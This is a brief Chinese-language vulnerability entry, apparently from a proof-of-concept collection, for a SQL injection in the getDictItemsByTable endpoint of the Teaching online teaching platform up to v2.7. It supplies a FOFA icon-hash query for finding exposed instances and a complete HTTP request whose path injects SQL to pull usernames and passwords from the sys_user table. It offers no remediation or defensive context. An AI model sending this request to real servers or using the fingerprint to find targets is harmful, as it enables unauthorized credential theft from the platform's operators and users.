# Teaching在线教学平台getDictItemsByTable存在sql注入漏洞

Teaching 在线教学平台 <= v2.7版本存在SQL注入漏洞，攻击者利用此漏洞可以获取系统敏感数据

## fofa

```javascript
icon_hash="1778610975"
```

## poc

```javascript
GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/username,password%20'/x.js HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![null](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411012002071.png)